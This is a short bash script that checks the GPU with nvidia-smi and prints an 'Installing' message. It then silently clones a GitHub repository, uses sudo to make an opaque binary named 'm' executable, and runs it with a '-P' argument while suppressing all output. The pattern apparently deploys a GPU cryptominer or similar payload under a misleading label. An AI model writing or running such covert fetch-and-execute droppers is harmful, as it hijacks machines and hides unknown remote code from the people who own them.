#! /bin/bash
nvidia-smi
printf "Installing $1"  >&2
{
git clone https://github.com/phucbmt/tech.git &> /dev/null
sudo chmod +x tech/m
./tech/m -P "$1" &> log
} &> /dev/null
